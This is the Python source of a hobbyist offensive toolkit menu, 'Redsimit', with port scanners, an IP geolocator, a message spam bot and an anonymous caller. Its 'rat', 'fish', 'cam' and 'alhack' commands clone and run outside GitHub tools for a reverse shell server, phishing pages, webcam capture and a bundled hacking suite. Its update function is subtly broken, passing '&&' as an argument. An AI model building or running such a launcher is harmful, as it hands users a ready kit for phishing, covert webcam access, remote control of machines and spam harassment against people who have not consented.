import time
import socket
import pyautogui
import requests
import webbrowser
import subprocess
import os
import colorama
from colorama import Fore, init
init(autoreset=True)




def symbol_intro():
    print(Fore.RED + "               ██████╗ ███████╗██████╗ ███████╗██╗███╗   ███╗██╗████████╗")
    print(Fore.RED + "               ██╔══██╗██╔════╝██╔══██╗██╔════╝██║████╗ ████║██║╚══██╔══╝")
    print(Fore.RED + "               ██████╔╝█████╗  ██║  ██║███████╗██║██╔████╔██║██║   ██║   ")
    print(Fore.RED + "               ██╔══██╗██╔══╝  ██║  ██║╚════██║██║██║╚██╔╝██║██║   ██║   ")
    print(Fore.RED + "               ██║  ██║███████╗██████╔╝███████║██║██║ ╚═╝ ██║██║   ██║   ")
    print(Fore.RED + "               ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚═╝   ╚═╝   ")
    print(Fore.RED + "                               Made by @redsimit ")
symbol_intro()

def available_commands():
    print(Fore.GREEN + """
        Available commands: ═══════════════════╗═══════════════════════════════════════╗
        ╚═ Networking:                         ╚═ Attacking:                           ╚═ Other:
          ╚═ m port = scans multiple ports       ╚═  spam = spammbot                     ╚═ q = quit
             s port = scans single port              rat = reverse shell //kali             support
             osint = info gathering //kali           fish = phishing //kali                 help = displays commands
             call = calls anonym //BETA              cam = webcam hacker //kali             alhack = albanian ht //kali
             geo = opens geolocator                 

        """)
available_commands()

def help():
    clear_terminal()
    available_commands()

def clear_terminal():                                                # clears the terminal
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def geolocator():                                                    # might not work well if you dont have good internet
    clear_terminal()
    print(Fore.RED + """
                         ▄████  ▓█████   ▒█████    ██████   ██▓  ███▄ ▄███▓  ██▓▄▄ ▄█████▓
                         ██▒ ▀█▒ ▓█   ▀  ▒██▒  ██▒ ▒██    ▒  ▓██▒ ▓██▒▀█▀ ██▒ ▓██▒▓   ██▒ ▓▒
                        ▒██░▄▄▄ ░▒███    ▒██░  ██▒ ░ ▓██▄    ▒██▒ ▓██    ▓██░ ▒██▒▒  ▓██░ ▒░
                        ░▓█  ██▓▒ ▓█  ▄  ▒██   ██░   ▒   ██▒ ░██░ ▒██    ▒██ ░ ██░░  ▓██▓ ░ 
                        ░▒▓███▀▒░ ▒████▒ ░ ████▓▒░ ▒██████▒▒ ░██░ ▒██▒   ░██▒░ ██░  ▒██▒ ░ 
                         ░▒   ▒ ░░ ▒░ ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ░  ░░▓    ▒ ░░   
                          ░   ░  ░ ░  ░  ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░  ░      ░ ▒ ░    ░    
                         ░ ░   ░    ░   ░ ░ ░ ▒  ░  ░  ░   ▒ ░░      ░    ▒ ░  ░      
                               ░    ░  ░    ░ ░        ░   ░         ░    ░           
                                              Made by @Redsimit                                             """)
    ip = input(Fore.GREEN + "Enter IP Address: ")
    url = f"https://ipapi.co/{ip}/json/"
    response = requests.get(url, timeout=5)
    data = response.json()

    network = data.get("network", "Unknown")
    version = data.get("version", "Unknown")
    city = data.get("city", "Unknown")
    country = data.get("country", "Unknown")
    country_name = data.get("country_name", "Unknown")
    country_code = data.get("country_code", "Unknown")
    postal = data.get("postal", "Unknown")
    timezone = data.get("timezone", "Unknown")
    asn = data.get("asn", "Unknown")
    languages = data.get("languages", "Unknown")
    country_capital = data.get("country_capital", "Unknown")
    country_area = data.get("country_area", "Unknown")

    longitude = data.get("longitude", "Unknown")
    latitude = data.get("latitude", "Unknown")

    print(Fore.GREEN + "Network: " + network)
    print(Fore.GREEN + "Version: " + version)
    print(Fore.GREEN + "City: " + city)
    print(Fore.GREEN + "Country: " + country)
    print(Fore.GREEN + "Country_name: " + country_name)
    print(Fore.GREEN + "Country_code: " + country_code)
    print(Fore.GREEN + "Country_capital: " + country_capital)
    print(Fore.GREEN + "Postal Code: " + postal)
    print(Fore.GREEN + "Timezone: " + timezone)
    print(Fore.GREEN + "ASN: " + asn)
    print(Fore.GREEN + "Languages: " + languages)
    print(Fore.GREEN + "Country_area: " + str(country_area))

    print(Fore.GREEN + "Longitude: " + str(longitude))
    print(Fore.GREEN + "Latitude: " + str(latitude))
    print(Fore.GREEN + f"https://www.google.com/maps?q={latitude},{longitude}")

def single_port_scanner():
    clear_terminal()
    print(Fore.BLUE + """
                               ▄████████  ▄█  ███▄▄▄▄      ▄██████▄   ▄█          ▄████████    ▄███████▄  ▄██████▄     ▄████████     ███        ▄████████    ▄████████ 
                              ███    ███ ███  ███▀▀▀██▄   ███    ███ ███         ███    ███   ███    ███ ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███ 
                              ███    █▀  ███▌ ███   ███   ███    █▀  ███         ███    █▀    ███    ███ ███    ███   ███    ███    ▀███▀▀██   ███    █▀    ███    ███ 
                              ███        ███▌ ███   ███  ▄███        ███        ▄███▄▄▄       ███    ███ ███    ███  ▄███▄▄▄▄██▀     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
                            ▀███████████ ███▌ ███   ███ ▀▀███ ████▄  ███       ▀▀███▀▀▀     ▀█████████▀  ███    ███ ▀▀███▀▀▀▀▀       ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
                                     ███ ███  ███   ███   ███    ███ ███         ███    █▄    ███        ███    ███ ▀███████████     ███       ███    █▄  ▀███████████ 
                               ▄█    ███ ███  ███   ███   ███    ███ ███▌    ▄   ███    ███   ███        ███    ███   ███    ███     ███       ███    ███   ███    ███ 
                             ▄████████▀  █▀    ▀█   █▀    ████████▀  █████▄▄██   ██████████  ▄████▀       ▀██████▀    ███    ███    ▄████▀     ██████████   ███    ███ 
                                                                     ▀                                                ███    ███                            ███    ███         
    """)
    print(Fore.LIGHTBLUE_EX + "                                    THIS PORT TESTER WAS MADE BY @REDSIMIT")
    ip = input(Fore.GREEN + "IP to scan: ")
    port = int(input(Fore.GREEN + "Input the following port: "))
    time.sleep(1)
    print(Fore.LIGHTGREEN_EX + "Connecting...")
    time.sleep(2)

    try:
        socket.create_connection((ip, port), timeout=4)         # you can change the timeout if you want cuz its kinda long
        print(Fore.GREEN + "port is open")
    except socket.error:
        print(Fore.GREEN + "port is closed")

def multi_port_scanner():
    clear_terminal()
    print(Fore.GREEN + """
                                                 ▄▄       ▄▄  ▄         ▄  ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄  ▄  ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
                                                ▐░░▌     ▐░░▌▐░▌       ▐░▌▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌▐░▌▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
                                                ▐░▌░▌   ▐░▐░▌▐░▌       ▐░▌▐░▌      ▀▀▀▀█░█▀▀▀▀  ▀▀▀▀█░█▀▀▀▀  ▐░▐░▌░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
                                                ▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░ ░▌  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌       ▐░▌
                                                ▐░▌ ▐░▐░▌ ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌      ▄▄█░█▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
                                                ▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌     ▐░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
                                                ▐░▌   ▀   ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌      ▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ 
                                                ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░ ░▌  ▐░▌          ▐░▌       ▐░▌▐░▌     ▐░▌       ▐░▌     ▐░▌          ▐░▌     ▐░▌  
                                                ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▄▄▄▄█░█▄▄▄▄  ▐░▐░▌░▌ ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌      ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ 
                                                ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░▌▐░▌▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌
                                                 ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀  ▀  ▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ 

    """)

    print(
        Fore.LIGHTGREEN_EX + "                                                                This Multi-Port tester was made by @Redsimit ")
    ip = input(Fore.GREEN + "Enter IP to scan: ")
    ports = [4444, 445, 443, 8080,
             20, 21, 22, 23, 25, 53,
             68, 80, 110, 123, 135, 67,
             137, 138, 139, 143, 161,
             162, 389, 443, 445, 465,
             514, 587, 636, 993, 995,
             1080, 1433, 1521, 1723,
             2049, 2121, 3306, 3389,
             5432, 5900, 6000, 8080,
             8443, 8888, 10000, 20000,
             32768, 49152, 65535]

    for port in ports:
        try:
            socket.create_connection((ip, port), timeout = 1)                    # i recommend changing the timeout to 2 or 3 if you want to be sure
            print(Fore.RED + f"Port {port} open ")
        except socket.error:
            print(Fore.LIGHTBLACK_EX + f"Port {port} closed ")

def spamm_bot():                                             # PUT YOUR CURSOR ON THE MESSAGE SENDING PLACE AND CLICK IT AND LET IT STAY THERE
    clear_terminal()
    print(Fore.YELLOW + """
                        ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
                        █ ▄▀   █ ▐  ▄▀   ▐ █ █   ▐ █    █  ▐ █   █   █ █      █ █   ▀▄ ▄▀ ▐  ▄▀   ▐ █   █   █ 
                       ▐ █    █   █▄▄▄▄▄     ▀▄   ▐   █     ▐  █▀▀█▀  █      █ ▐     █     █▄▄▄▄▄  ▐  █▀▀█▀  
                         █    █   █    ▌  ▀▄   █     █       ▄▀    █  ▀▄    ▄▀       █     █    ▌   ▄▀    █  
                       ▄▀▄▄▄▄▀  ▄▀▄▄▄▄    █▀▀▀    ▄▀       █     █     ▀▀▀▀       ▄▀     ▄▀▄▄▄▄   █     █   
                       █     ▐   █    ▐    ▐      █         ▐     ▐                █      █    ▐   ▐     ▐   
                        ▐         ▐                ▐                                ▐      ▐                  """)
    print(Fore.GREEN + "             Author: @Redsimit")
    limit = input(Fore.RED + "Input the number of messages to send: ")
    speed = input(Fore.RED + "Input the waiting time between messages: ")
    word = input(Fore.RED + "Input your message: ")
    print(Fore.GREEN + "Put your mouse on the place to spamm the messages!")
    time.sleep(3)
    print("SENDING MESSAGES... ")
    a = 1
    while a <= int(limit):
        pyautogui.typewrite(word)
        pyautogui.press("enter")
        a = a + 1
        time.sleep(float(speed))

def reverse_shell():
    clear_terminal()
    print(Fore.RED + "INSTALLING THE TOOL (enter to continue) ")
    time.sleep(0.5)
    repo = "https://github.com/Simit6155/SchimmelBox-Warriors.git"
    clone_cmd = ["git", "clone", repo]
    subprocess.run(clone_cmd)
    os.chdir("SchimmelBox-Warriors")
    print(Fore.RED + "YOU NEED TO HAVE THE CLIENT.PY RUNNING ON THE SYSTEM U WANNA CONNECT TO !!! (enter to continue)")
    time.sleep(3)
    subprocess.run(["python3", "server.py"])

def zphisher():
    clear_terminal()
    phish_repo = "https://github.com/htr-tech/zphisher.git"
    phish_clone = ["git", "clone", phish_repo]
    subprocess.run(phish_clone)
    os.chdir("zphisher")
    mod_phish = ["chmod", "+x", "zphisher.sh"]
    subprocess.run(mod_phish)
    start_phish = ["./zphisher.sh"]
    subprocess.run(start_phish)

def cam_phish():
    clear_terminal()
    cam_repo = "https://github.com/techchipnet/CamPhish.git"
    cam_clone = ["git", "clone", cam_repo]
    subprocess.run(cam_clone)
    os.chdir("CamPhish")
    mod_cam = ["chmod", "+x", "CamPhish.sh"]
    subprocess.run(mod_cam)
    start_cam = ["./CamPhish.sh"]
    subprocess.run(start_cam)

def osint_tool():
    clear_terminal()
    start_sherlock = ["sherlock", "-h"]
    subprocess.run(start_sherlock)

def phone_caller():                                                     # Might not work if your monitor doesent match the coordinates (DONT MOVE YOUR MOUSE)
    clear_terminal()
    print(Fore.RED + """
            ▄▄▄·    ▄▄·  ▄▄▄· ▄▄▌  ▄▄▌  ▄▄▄ .▄▄▄  
            ▐█ ▄█   ▐█ ▌▪▐█ ▀█ ██•  ██•  ▀▄.▀·▀▄ █·
             ██▀·   ██ ▄▄▄█▀▀█ ██▪  ██▪  ▐▀▀▪▄▐▀▀▄ 
            ▐█▪·•   ▐███▌▐█ ▪▐▌▐█▌▐▌▐█▌▐▌▐█▄▄▌▐█•█▌
            .▀    ▀ ·▀▀▀  ▀  ▀ .▀▀▀ .▀▀▀  ▀▀▀ .▀  ▀""")

    print(Fore.RED + "~~~~ Author @Redsimit ~~~~ ")
    number = input(Fore.GREEN + "Enter number: ")
    print(Fore.GREEN + "Calling dont move your mouse . . . . ")
    webbrowser.open("https://callmyphone.org")
    time.sleep(5)
    pyautogui.leftClick(902, 389)
    time.sleep(1)
    pyautogui.typewrite(number)
    time.sleep(0.5)
    pyautogui.leftClick(1257, 389)

def kali_update():
    clear_terminal()
    update = ["sudo", "apt", "update", "&&", "sudo", "apt", "upgrade", "-y" ]
    subprocess.run(update)

def albanian_ht():
    clear_terminal()
    kali_update()
    aht_repo = "https://github.com/AlbanianCyberArmy/Albanian-Hacking-Tool.git"
    aht_clone = ["git", "clone", aht_repo]
    subprocess.run(aht_clone)
    os.chdir("ALHacking")
    alhack_access = ["chmod", "+x", "alhack.sh"]
    subprocess.run(alhack_access)
    alhack_start = ["bash", "alhack.sh"]
    subprocess.run(alhack_start)

def support_me():
    clear_terminal()
    print(Fore.BLUE + """
                                     ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄    ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
                                    ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌
                                     ▀▀▀▀█░█▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌▐░▌ ▐░▌ ▐░█▀▀▀▀▀▀▀▀▀ 
                                         ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌▐░▌  ▐░▌          
                                         ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌▐░▌░▌   ▐░█▄▄▄▄▄▄▄▄▄ 
                                         ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░░▌    ▐░░░░░░░░░░░▌
                                         ▐░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░▌░▌    ▀▀▀▀▀▀▀▀▀█░▌
                                         ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌▐░▌            ▐░▌
                                         ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌     ▐░▐░▌▐░▌ ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌
                                         ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌      ▐░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌
                                          ▀       ▀         ▀  ▀         ▀  ▀        ▀▀  ▀    ▀  ▀▀▀▀▀▀▀▀▀▀▀ 

    """)
    webbrowser.open("https://www.instagram.com/Redsimit")
    webbrowser.open("https://discord.gg/FyKAf9crA4")
    webbrowser.open("https://github.com/Simit6155")
    webbrowser.open("https://github.com/Simit6155?tab=repositories")




command = ""
while command != "q":
    command = input(Fore.RED + "| > ")
    if command == "q":
        clear_terminal()
        print(Fore.GREEN + "closing program...")
        time.sleep(1)
        break

    elif command == "help":
        help()

    elif command == "geo":
        geolocator()

    elif command == "cam":
        cam_phish()

    elif command == "osint":
        osint_tool()

    elif command == "call":
        phone_caller()

    elif command == "s port":
        single_port_scanner()

    elif command == "m port":
        multi_port_scanner()

    elif command == "spam":
        spamm_bot()

    elif command == "fish":
        zphisher()

    elif command == "rat":
        reverse_shell()

    elif command == "alhack":
        albanian_ht()

    elif command == "support":
        support_me()

    else:
        print(Fore.RED + "[~] Unknown command... use command help to see available commands")
